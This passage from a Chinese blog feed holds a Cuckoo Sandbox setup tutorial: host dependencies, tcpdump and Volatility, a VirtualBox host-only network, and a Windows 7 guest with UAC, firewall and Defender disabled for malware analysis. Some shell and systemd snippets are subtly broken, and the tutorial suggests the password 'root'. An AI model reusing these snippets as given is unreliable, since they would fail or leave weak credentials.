href="https://blog.csdn.net/weixin_39510813/article/details/78387334?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default" target="_blank" rel="noopener">跳转</a></p><h1 id="8-总结"><a class="markdownIt-Anchor" href="#8-总结"></a> 8 总结</h1><p>扩展磁盘空间完成，df再看一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop df -l</span><br><span class="line">Filesystem     1K-blocks     Used Available Use% Mounted on</span><br><span class="line">udev             4019184        0   4019184   0% /dev</span><br><span class="line">tmpfs             810936     2032    808904   1% /run</span><br><span class="line">/dev/sda5      102431704 46674596  51153504  48% /</span><br></pre></td></tr></table></figure><p>现在已经完成任务。</p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cuckoo Sandbox 安装教程</title>
      <link href="/2022/01/30/Cuckoo-Sandbox-%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2022/01/30/Cuckoo-Sandbox-%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-简介"><a class="markdownIt-Anchor" href="#0-简介"></a> 0 简介</h1><p>Cuckoo Sandbox 是一个开源的自动分析可疑文件的软件。它通过在独立环境内使用自定义组件来监控恶意进程的行为。</p><p>它可以分析出以下几种类型的结果:</p><blockquote><ul><li>跟踪恶意软件产生函数调用.</li><li>恶意软件执行期间的文件操作，包括新建，删除以及文件下载.</li><li>恶意软件的内存转储.</li><li>PCAP格式的网络流量捕获.</li><li>恶意软件运行时的截屏.</li><li>虚拟机的完整内存转储文件.</li></ul></blockquote><p>Cuckoo 由一个宿主机（管理组件）加上多个沙箱（物理机或者虚拟机）组成。 宿主机上的管理组件负责了一个样本分析的全部过程，样本的执行过程都是在沙箱中进行。</p><img src="https://s2.loli.net/2022/01/30/laJ2s3Nh5oUg8IM.png" width="500" height="300" alt="图片名称" align="center" id="37"><ul><li><a href="https://cuckoosandbox.org/" target="_blank" rel="noopener">官网</a></li><li><a href="https://cuckoo.sh/docs/" target="_blank" rel="noopener">官方文档-英文</a></li><li><a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">官方文档-中文</a></li></ul><h1 id="1-环境准备"><a class="markdownIt-Anchor" href="#1-环境准备"></a> 1 环境准备</h1><p>本次搭建Cuckoo环境，主要参考<a href="https://blog.csdn.net/ElsonHY/article/details/115607255" target="_blank" rel="noopener">教程</a>，使用一个宿主机+一个沙箱(guest)的模式，具体如下：</p><table><thead><tr><th style="text-align:center">软件</th><th style="text-align:center">host</th><th style="text-align:center">guest1</th><th style="text-align:center">guest2</th></tr></thead><tbody><tr><td style="text-align:center">VMware 16 Pro</td><td style="text-align:center">Ubuntu20.04 LTS(推荐GNU/Linux)</td><td style="text-align:center">VM window7-64bit(推荐64位Win7或WinXP)</td><td style="text-align:center">VM Ubuntu虚拟机 virtualbox win7</td></tr></tbody></table><p>其中Win7需要关闭UAC(User Access Control)。</p><p>guest打算使用VMWare下直接虚拟机——win7，但是失败了；</p><p>成功实现的guest是Ubuntu下的virtualbox下的win7。</p><h1 id="2-host安装"><a class="markdownIt-Anchor" href="#2-host安装"></a> 2 host安装</h1><h2 id="21-创建-ubuntu2004-lts-虚拟机"><a class="markdownIt-Anchor" href="#21-创建-ubuntu2004-lts-虚拟机"></a> 2.1 创建 Ubuntu20.04 LTS 虚拟机</h2><p>网上好多参考教程</p><p><font color="red">注意:</font></p><ul><li>Ubuntu20.04虚拟机需要至少4GB的RAM和60–80GB的硬盘，因为你将在里面运行一个windows7虚拟机</li><li>请确保不要将您的用户名称为“cuckoo”，否则这可能会与以后的安装冲突。</li><li>确保您的虚拟机已启用VT-x功能</li></ul><p>Vmware中虚拟机启用VT-x功能后，再打开Ubuntu虚拟机出现报错<code>此平台不支持虚拟化的 AMD-V/RVI。</code></p><p>解决：关闭 <code>Windows 功能</code> 里的 <code>虚拟机平台</code>，重启后即可。</p><h2 id="22-依赖"><a class="markdownIt-Anchor" href="#22-依赖"></a> 2.2 依赖</h2><h3 id="221-安装-python-库-ubuntudebian-based"><a class="markdownIt-Anchor" href="#221-安装-python-库-ubuntudebian-based"></a> 2.2.1 安装 Python 库 (Ubuntu/Debian-based)</h3><p>Cuckoo的管理组件完全由Python脚本编写，所以就需要适合的Python版本。 当前，我们完全兼容的Python版本是 <strong>2.7</strong>。</p><p>老版本的Python和Python 3（未来可能会支持） 目前都是不支持的。</p><hr><p><strong>依赖库：</strong><font color="red">(注意：Ubuntu20中已将python2移除)</font></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step1 安装python2</span></span><br><span class="line">sudo apt install python2</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 安装pip2，Ubuntu 20已经无法通过apt来安装python2的pip2了</span></span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line"><span class="comment"># 使用：python2 -m pip install numpy</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 安装Virtualenv</span></span><br><span class="line">sudo apt-get install virtualenv</span><br><span class="line"><span class="comment"># 使用： virtualenv --python=python2 env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step4 安装其他的</span></span><br><span class="line">sudo apt install python-dev libffi-dev libssl-dev</span><br><span class="line">sudo apt-get install libjpeg-dev zlib1g-dev swig</span><br><span class="line">sudo apt install python-setuptools</span><br></pre></td></tr></table></figure><hr><p>如果要使用我们基于Django开发的Web界面, 则MongoDB是必须要安装的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mongodb</span><br></pre></td></tr></table></figure><hr><p>如果要使用PostgreSQL数据库(推荐), PostgreSQL也必须安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install postgresql libpq-dev</span><br></pre></td></tr></table></figure><hr><p>如果使用KVM的话，则需要安装KVM相关依赖：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-kvm</span><br><span class="line">sudo apt-get install libvirt-dev libvirt-daemon libvirt-clients</span><br><span class="line"><span class="comment"># 未完成</span></span><br><span class="line">libvirt-bin ubuntu-vm-builder bridge-utils python-libvirt</span><br></pre></td></tr></table></figure><p>安装Yara：（可选）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install yara-python==3.6.3</span><br></pre></td></tr></table></figure><p>安装ssdeep：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y ssdeep</span><br></pre></td></tr></table></figure><p>安装pydeep：(可选，未完成)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install -U pip setuptools</span><br></pre></td></tr></table></figure><p>安装openpyxl：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install openpyxl</span><br></pre></td></tr></table></figure><p>安装ujson:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install ujson</span><br></pre></td></tr></table></figure><p>现在安装jupyter：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install jupyter</span><br></pre></td></tr></table></figure><h3 id="222-虚拟化软件"><a class="markdownIt-Anchor" href="#222-虚拟化软件"></a> 2.2.2 虚拟化软件</h3><p>Cuckoo沙箱支持大部分的虚拟化软件，可以很方便的添加和使用各种虚拟化支持。</p><p>本文档以VirtualBox为例，选择哪种虚拟机软件并不影响后续的分析。</p><p>安装VirtualBox：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install virtualbox</span><br></pre></td></tr></table></figure><h3 id="223-安装-tcpdump"><a class="markdownIt-Anchor" href="#223-安装-tcpdump"></a> 2.2.3 安装 tcpdump</h3><p>Tcpdump用于抓取恶意软件运行过程中产生的所有流量。</p><p>安装命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install tcpdump apparmor-utils</span><br><span class="line">sudo aa-disable /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure><p><code>AppArmor</code> 只有当PCAP文件生成没有权限的时候才需要，可以参考 <a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/faq/index.html#tcpdump-permission-denied" target="_blank" rel="noopener">Permission denied for tcpdump</a></p><p>Tcpdump需要root权限，如果不想运行在root用户下，需要做以下设置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">setcap</span> cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure><p>可以用以下命令验证是否配置正确：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> /usr/sbin/tcpdump</span><br><span class="line">/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure><p>如果没有<code>setcap</code>命令， 则需要安装下面的包:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libcap2-bin</span></span><br></pre></td></tr></table></figure><p>或者 (<strong>不推荐</strong>)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chmod +s /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure><p>需要注意的是 setcap 命令不安全，有可能造成提权漏洞，我们建议将Cuckoo安装在专有的环境里。</p><h3 id="224-安装-volatility"><a class="markdownIt-Anchor" href="#224-安装-volatility"></a> 2.2.4 安装 Volatility</h3><p>Volatility 用于分析内存转储文件的可选工具. Cuckoo与Volatility配合，可以更深度和全面的分析，可以防止恶意软件利用rookit技术逃逸沙箱的监控。</p><p>为了能够工作正常，Cuckoo要求Volatility版本不低于 2.3， 推荐最新版本2.5。 可以从官网下载 <a href="https://github.com/volatilityfoundation" target="_blank" rel="noopener">official repository</a>.</p><p>可以查阅Volatility官方文档的安装说明.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/volatilityfoundation/volatility.git </span><br><span class="line"><span class="built_in">cd</span> volatility</span><br><span class="line">sudo python setup.py build</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>安装Distorm3：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install distorm3==3.4.4</span><br></pre></td></tr></table></figure><h3 id="225-安装-m2crypto"><a class="markdownIt-Anchor" href="#225-安装-m2crypto"></a> 2.2.5 安装 M2Crypto</h3><p>当前 <code>M2Crypto</code> 库需要 <a href="http://www.swig.org/" target="_blank" rel="noopener">SWIG</a> 支持. Ubuntu/Debian-like 系统下可以通过以下命令安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install swig</span><br></pre></td></tr></table></figure><p><code>SWIG</code> 安装好之后，通过以下命令安装 <code>M2Crypto</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python2 -m pip install m2crypto</span><br></pre></td></tr></table></figure><h3 id="226-安装-guacd未完成"><a class="markdownIt-Anchor" href="#226-安装-guacd未完成"></a> 2.2.6 安装 guacd(未完成)</h3><p><code>guacd</code> 是RDP，SSH，VNC等远程控制的代理层， 是Cuckoo的Web界面的远程终端中使用，可选。</p><p>没有它，远程控制功能就无法使用，版本要求0.9.9及以上。我们推荐安装最新版本 使用如下命令安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libguac-client-rdp0 libguac-client-vnc0 libguac-client-ssh0 guacd</span><br></pre></td></tr></table></figure><h2 id="23-cuckoo-安装"><a class="markdownIt-Anchor" href="#23-cuckoo-安装"></a> 2.3 Cuckoo 安装</h2><h3 id="231-创建用户没使用使用dragon用户下"><a class="markdownIt-Anchor" href="#231-创建用户没使用使用dragon用户下"></a> 2.3.1 创建用户（没使用，使用dragon用户下）</h3><p>Cuckoo可以运行在已有用户下面，也可以新建一个用户来跑Cuckoo。 但是要保证虚拟机和Cuckoo运行在相同的用户下。（让一个单独的用户来运行沙盒是一种很好的安全习惯。）</p><p>创建新用户：（密码为root，其他回车即可）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser cuckoo</span><br></pre></td></tr></table></figure><p>若使用virtualBox则创建一个cuckoo用户，将其添加到vboxusers组里（VirtualBox安装后创建）。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G vboxusers cuckoo</span><br></pre></td></tr></table></figure><p>将该用户添加到sudo组。输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser cuckoo sudo</span><br></pre></td></tr></table></figure><p>如果使用KVM，要将用户加入到Libvirtd用户组:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G libvirtd cuckoo</span><br></pre></td></tr></table></figure><h3 id="232-安装-cuckoo"><a class="markdownIt-Anchor" href="#232-安装-cuckoo"></a> 2.3.2 安装 Cuckoo</h3><p>全局安装Cuckoo是没有问题的，但是 <strong>强力推荐</strong> 用 <code>virtualenv</code> 来安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ virtualenv --python=python2 venv</span><br><span class="line">$ . venv/bin/activate</span><br><span class="line">(venv)$ pip install -U pip setuptools</span><br><span class="line">(venv)$ pip install -U cuckoo</span><br></pre></td></tr></table></figure><p><font color="green">提醒：cuckoo下载较慢，30min左右</font></p><p>为什么推荐使用 <code>virtualenv</code> 呢:</p><ul><li>Cuckoo的依赖并不是用的最新版本，可能会与系统已有的版本冲突.</li><li>系统中其他软件的安装，可能会导致Cuckoo的依赖产生问题.</li><li>使用virtualenv，可以让非root用户也可以安装相关软件.</li><li>简单来说virtualenv是最佳实践.</li></ul><h2 id="24-cuckoo-工作目录"><a class="markdownIt-Anchor" href="#24-cuckoo-工作目录"></a> 2.4 Cuckoo 工作目录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换用户cuckoo</span></span><br><span class="line">su cuckoo</span><br><span class="line"><span class="comment"># 进入虚拟环境</span></span><br><span class="line">. ./venv/bin/activate</span><br><span class="line"><span class="comment"># 首次运行</span></span><br><span class="line">cuckoo -d</span><br></pre></td></tr></table></figure><p>出现以下界面：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/home/dragon/graduation/venv/lib/python2.7/site-packages/sflock/decode/office.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line"></span><br><span class="line">    sSSs   .S       S.     sSSs   .S    S.     sSSs_sSSs      sSSs_sSSs</span><br><span class="line">   d%%SP  .SS       SS.   d%%SP  .SS    SS.   d%%SP~YS%%b    d%%SP~YS%%b</span><br><span class="line">  d%S<span class="string">'    S%S       S%S  d%S'</span>    S%S    S&amp;S  d%S<span class="string">'     `S%b  d%S'</span>     `S%b</span><br><span class="line">  S%S     S%S       S%S  S%S     S%S    d*S  S%S       S%S  S%S       S%S</span><br><span class="line">  S&amp;S     S&amp;S       S&amp;S  S&amp;S     S&amp;S   .S*S  S&amp;S       S&amp;S  S&amp;S       S&amp;S</span><br><span class="line">  S&amp;S     S&amp;S       S&amp;S  S&amp;S     S&amp;S_sdSSS   S&amp;S       S&amp;S  S&amp;S       S&amp;S</span><br><span class="line">  S&amp;S     S&amp;S       S&amp;S  S&amp;S     S&amp;S~YSSY%b  S&amp;S       S&amp;S  S&amp;S       S&amp;S</span><br><span class="line">  S&amp;S     S&amp;S       S&amp;S  S&amp;S     S&amp;S    `S%  S&amp;S       S&amp;S  S&amp;S       S&amp;S</span><br><span class="line">  S*b     S*b       d*S  S*b     S*S     S%  S*b       d*S  S*b       d*S</span><br><span class="line">  S*S.    S*S.     .S*S  S*S.    S*S     S&amp;  S*S.     .S*S  S*S.     .S*S</span><br><span class="line">   SSSbs   SSSbs_sdSSS    SSSbs  S*S     S&amp;   SSSbs_sdSSS    SSSbs_sdSSS</span><br><span class="line">    YSSP    YSSP~YSSY      YSSP  S*S     SS    YSSP~YSSY      YSSP~YSSY</span><br><span class="line">                                 SP</span><br><span class="line">                                 Y</span><br><span class="line"></span><br><span class="line"> Cuckoo Sandbox 2.0.7</span><br><span class="line"> www.cuckoosandbox.org</span><br><span class="line"> Copyright (c) 2010-2018</span><br><span class="line"></span><br><span class="line">=======================================================================</span><br><span class="line">    Welcome to Cuckoo Sandbox, this appears to be your first run!</span><br><span class="line">    We will now <span class="built_in">set</span> you up with our default configuration.</span><br><span class="line">    You will be able to see and modify the Cuckoo configuration,</span><br><span class="line">    Yara rules, Cuckoo Signatures, and much more to your likings</span><br><span class="line">    by exploring the /home/cuckoo/.cuckoo directory.</span><br><span class="line"></span><br><span class="line">    Among other configurable items of most interest is the</span><br><span class="line">    new location <span class="keyword">for</span> your Cuckoo configuration:</span><br><span class="line">              /home/cuckoo/.cuckoo/conf</span><br><span class="line">=======================================================================</span><br><span class="line"></span><br><span class="line">Cuckoo has finished setting up the default configuration.</span><br><span class="line">Please modify the default settings <span class="built_in">where</span> required and</span><br><span class="line">start Cuckoo again (by running `cuckoo` or `cuckoo -d`).</span><br></pre></td></tr></table></figure><h1 id="3-guest安装在ubuntu2004中的virtualbox中"><a class="markdownIt-Anchor" href="#3-guest安装在ubuntu2004中的virtualbox中"></a> 3 guest安装(在Ubuntu20.04中的VirtualBox中)</h1><h2 id="31-设置virtualbox环境"><a class="markdownIt-Anchor" href="#31-设置virtualbox环境"></a> 3.1 设置virtualbox环境</h2><p>安装网络工具：<code>sudo apt install -y net-tools</code>，现在键入<code>ifconfig</code>以查找虚拟机的IP地址信息。</p><img src="https://s2.loli.net/2022/01/31/zCv8PyLSDpwJUKO.png" width="600" height="300" alt="图片名称" align="center" id="39"><p>创建一个只支持主机的网络适配器：<code>vboxmanage hostonlyif create</code></p><p>为虚拟接口设置IP地址：<code>vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1</code></p><p>再次运行<code>ifconfig</code>，将看到刚刚设置的接口和IP地址：</p><img src="https://s2.loli.net/2022/01/31/2uWvZkIcfxSatzw.png" width="600" height="300" alt="图片名称" align="center" id="41"><p>我们要使这些更改在重新启动后仍然有效，并在系统启动期间自动设置。所以我们需要建立一个新的目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /opt/systemd/</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /opt/systemd/vboxhostonly</span><br></pre></td></tr></table></figure><p>并将以下代码复制到文件中：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">hostonlyif create</span><br><span class="line">vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1</span><br></pre></td></tr></table></figure><p>现在我们需要使文件可执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/systemd/</span><br><span class="line">sudo chmod a+x vboxhostonly</span><br></pre></td></tr></table></figure><p>现在我们需要创建一个服务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/systemd/system/vboxhostonlynic.service</span><br></pre></td></tr></table></figure><p>编辑文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/vboxhostonlynic.service</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Description=Setup VirtualBox Hostonly Adapter</span><br><span class="line">After=vboxdrv.service</span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/opt/systemd/vboxhostonly</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>现在安装服务并确保它在引导时加载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> vboxhostonlynic.service</span><br></pre></td></tr></table></figure><p>网络部分完成。</p><h2 id="32-创建win7-x64虚拟机"><a class="markdownIt-Anchor" href="#32-创建win7-x64虚拟机"></a> 3.2 创建Win7-x64虚拟机</h2><p>选择镜像 <a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">win7-x64-sp1</a></p><p>启动Oracle VirtualBox Manager</p><p>单击New图标创建一个新的虚拟机<code>guest1</code>，选择合适的操作系统：</p><img src="https://s2.loli.net/2022/01/31/VLlkqKRCxXSA6ng.png" width="550" height="300" alt="图片名称" align="center" id="42"><p>现在单击下一步。选择要分配的RAM大小。理想情况下，最小值为4GB。我将设置为4096MB（4GB）:</p><img src="https://s2.loli.net/2022/01/31/jqlO5M3kPba9XQI.png" width="550" height="300" alt="图片名称" align="center" id="43"><p>单击下一步。通过单击“创建”创建虚拟硬盘：</p><img src="https://s2.loli.net/2022/01/31/5L1zeiETygwM62b.png" width="550" height="300" alt="图片名称" align="center" id="44"><p>选择VDI并单击Next，选择“动态分配”，然后单击“下一步”。</p><p>选择你的硬盘大小。我已设置为32GB，现在单击“创建”。</p><p>现在你需要把Windows7ISO文件装载到你的Ubuntu虚拟机上。</p><p>单击“确定”。这将把Windows7.iso安装到虚拟机中。现在单击VirtualBox中的设置，然后转到存储。现在单击CD（空）。在右侧或光盘驱动器上，单击CD旁边的向下箭头，然后选择主机驱动器作为CD选项。</p><img src="https://s2.loli.net/2022/01/31/gQFULNs62cT57HO.png" width="550" height="300" alt="图片名称" align="center" id="45"><p>单击“确定”关闭，然后开始启动虚拟机。按照正常的Windows7安装。我把我的Windows7虚拟机叫做guest1。</p><p>现在您的Windows7虚拟机已构建，请登录。（卡顿的原因可能是Ubuntu虚拟机磁盘空间不足，<a href="http://dragonliu.tk/2022/02/02/VMWare%E8%99%9A%E6%8B%9F%E6%9C%BAUbuntu20-04-LTS%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E4%B8%8D%E8%B6%B3%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">解决方法</a>）</p><h2 id="33-进行配置"><a class="markdownIt-Anchor" href="#33-进行配置"></a> 3.3 进行配置</h2><p>我们将进行一些更改，以使虚拟机故意易受攻击。转到“开始”并键入组。您应该看到“编辑组策略”选项。</p><img src="https://s2.loli.net/2022/02/01/1iFaKsx5WJmSNjy.png" width="550" height="300" alt="图片名称" align="center" id="46"><p>展开“计算机配置”&gt;“Windows设置”&gt;“安全设置”&gt;“本地策略”&gt;“安全选项”。向下滚动到用户帐户控制选项。</p><img src="https://s2.loli.net/2022/02/01/N6IvV85oZwDY2c7.png" width="550" height="300" alt="图片名称" align="center" id="47"><p>右键单击“用户帐户控制：管理员批准模式中管理员的提升权限提示的行为”，然后选择“属性”。使用下拉菜单选择“不提示，直接提升”，然后单击“确定”。</p><img src="https://s2.loli.net/2022/02/01/FVwSXrlKARNyiUx.png" width="550" height="300" alt="图片名称" align="center" id="48"><p>右键单击“用户帐户控制：检测应用程序安装并提示提升”，然后选择属性。选中“禁用”选项，然后单击“确定”。</p><img src="https://s2.loli.net/2022/02/01/9ytdwx5N42ojqbs.png" width="550" height="300" alt="图片名称" align="center" id="49"><p>右键单击“用户帐户控制：以管理员批准模式运行所有管理员”，然后选择属性。选中“禁用”选项，然后单击“确定”。</p><img src="https://s2.loli.net/2022/02/01/gvr4TaikESyMt3j.png" width="550" height="300" alt="图片名称" align="center" id="50"><p>现在我们关闭windows防火墙和自动更新，原因为他们可能影响恶意软件的行为。</p><img src="https://s2.loli.net/2022/02/01/spFXaOW65ntdRCG.png" width="550" height="300" alt="图片名称" align="center" id="51"><img src="https://s2.loli.net/2022/02/01/spFXaOW65ntdRCG.png" width="550" height="300" alt="图片名称" align="center" id="52"><p>接下来我们需要禁用Windows Defender，将“自动扫描”和“实时保护”关闭：</p><img src="https://s2.loli.net/2022/02/01/pZKmeODJ7wCASx2.png" width="550" height="300" alt="图片名称" align="center" id="53"><h2 id="34-安装软件"><a class="markdownIt-Anchor" href="#34-安装软件"></a> 3.4 安装软件</h2><p>单击VirtualBox窗口中的设备并选择InstallVirtualBox Guest Additions完成安装；</p><p>添加一个共享文件夹，使用<code>Downloads</code>文件夹：</p><img src="https://s2.loli.net/2022/02/01/ToqhEst3VQnkKmb.png" width="550" height="300" alt="图片名称" align="center" id="54"><p>转到Windows中的文件资源管理器并键入<code>\\vboxsvr\*Downloads</code> 即可访问Ubuntu中的文件夹。</p><p>物理机下载<a href="https://www.python.org/ftp/python/2.7.8/python-2.7.8.amd64.msi" target="_blank" rel="noopener">python2.7</a>，将此安装包放入共享文件夹并从Windows7虚拟机运行，安装的时侯选择 add python to path；</p><p>下载<a href="https://pypi.python.org/packages/2.7/P/Pillow/Pillow-2.5.3.win-amd64-py2.7.exe#md5=33c3a581ff1538b4f79b4651084090c8" target="_blank" rel="noopener">Python Pillow</a>，将安装包放入共享文件夹并从Windows 7虚拟机运行。</p><p>（未完成）现在安装Adobe Reader、Flash、Java和Microsoft Office（可选）以及您认为可能需要的任何其他应用程序。</p><p>（未完成）打开Internet Explorer和Adobe Reader以及任何其他可能有可能干扰cuckoo客户端操作的闪屏的应用程序。</p><h2 id="35-安装客户端"><a class="markdownIt-Anchor" href="#35-安装客户端"></a> 3.5 